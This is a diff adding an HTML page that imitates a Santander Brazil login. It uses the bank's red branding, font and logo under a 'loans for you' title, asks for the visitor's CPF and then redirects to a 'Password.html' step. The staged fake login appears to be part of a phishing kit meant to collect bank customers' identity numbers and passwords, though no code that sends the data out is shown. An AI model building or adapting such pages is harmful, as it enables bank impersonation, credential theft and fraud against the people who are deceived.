@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Empréstimos para você</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  
+  <!-- Fonte Santander Text W05 Light -->
+  <link href="https://db.onlinewebfonts.com/c/65bbf843c200ca74fbd6abe228aa7874?family=Santander+Text+W05+Light" rel="stylesheet" type="text/css"/>
+  
+  <style>
+    body {
+      font-family: 'Santander Text W05 Light', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .header {
+      background-color: #EC0000;
+      padding: 3px;
+      display: flex;
+      align-items: center;
+    }
+
+    .header img {
+      height: 60px;
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start; /* Alinha ao topo */
+      align-items: center;
+      padding: 15px;
+      background-color: #ffffff;
+    }
+
+    .container h1 {
+      font-size: 20px;
+      color: #333;
+      margin-top: 8px;
+      margin-bottom: 5px; /* Reduz a distância do texto abaixo */
+      text-align: left;
+      width: 100%;
+    }
+
+    .container p {
+      font-size: 14px;
+      color: #666;
+      margin-top: 0; /* Remove a margem superior */
+      margin-bottom: 15px;
+      text-align: left;
+      width: 100%;
+    }
+
+    .input-container {
+      position: relative;
+      width: 100%;
+      max-width: 315px;
+      margin-top: 55px; /* Diminuí o valor para 10px */
+      margin-bottom: 15px;
+    }
+
+    .input-container input {
+      width: 100%;
+      padding: 13px;
+      font-size: 16px;
+      border: 1px solid #989898;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+
+    .input-container input:focus {
+      border-color: #767676;
+      outline: none;
+    }
+
+    .input-container i {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #EC0000;
+      font-size: 16px;
+      display: none;
+    }
+
+    .input-container.error i {
+      display: inline;
+    }
+
+    .input-container.error input {
+      border-color: #EC0000;
+    }
+
+    .button-container {
+      width: 100%;
+      max-width: 300px;
+      margin-top: 370px;
+    }
+
+    .button-container button {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      background-color: #ccc;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      cursor: not-allowed;
+      transition: background-color 0.3s;
+    }
+
+    .button-container button.active {
+      background-color: #EC0000;
+      cursor: pointer;
+    }
+
+    .button-container button:hover {
+      background-color: #C10000;
+    }
+
+    .footer {
+      padding: 10px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      background-color: #f9f9f9;
+    }
+
+    .footer a {
+      color: #EC0000;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img alt="Santander Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAAG1rQ6c3vMyzjilAoFUhQsYNjBXrmq6Txw&usqp=CAU"/>
+  </div>
+
+  <div class="container">
+    <h1>Acessar sua conta</h1>
+    <p>Digite seu CPF para prosseguir com seu login.</p>
+
+    <div class="input-container" id="cpfContainer">
+      <input id="cpf" placeholder="Insira seu CPF" type="text" maxlength="14" oninput="handleInput()" />
+      <i class="fas fa-exclamation-triangle"></i>
+    </div>
+
+    <div class="button-container">
+      <button id="continueButton" onclick="validateCPF()">Continuar</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    Ao continuar, você concorda com os <a href="#">Termos e Condições</a>.
+  </div>
+
+  <script>
+    // Função para formatar o CPF
+    function handleInput() {
+      const cpfInput = document.querySelector('#cpf');
+      const cpfContainer = document.querySelector('#cpfContainer');
+      let cpf = cpfInput.value.replace(/\D/g, '');
+
+      // Remove a classe de erro ao digitar novamente
+      cpfContainer.classList.remove('error');
+
+      // Formata o CPF automaticamente
+      if (cpf.length <= 11) {
+        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      }
+
+      cpfInput.value = cpf;
+
+      // Habilitar o botão apenas se o CPF estiver completo
+      const button = document.querySelector('#continueButton');
+      if (cpf.length === 14) {
+        button.disabled = false;
+        button.classList.add('active');
+      } else {
+        button.disabled = true;
+        button.classList.remove('active');
+      }
+    }
+
+    // Função para validar o CPF ao clicar no botão "Continuar"
+    function validateCPF() {
+      const cpfInput = document.querySelector('#cpf');
+      const cpfContainer = document.querySelector('#cpfContainer');
+      const cpf = cpfInput.value.replace(/\D/g, '');
+
+      if (cpf.length !== 11) {
+        cpfContainer.classList.add('error');
+      } else {
+        cpfContainer.classList.remove('error');
+        alert("CPF válido!");
+        // Redireciona para a página seguinte
+        window.location.href = 'Password.html'; // Substitua com o URL da página desejada
+      }
+    }
+  </script>
+</body>
+</html>
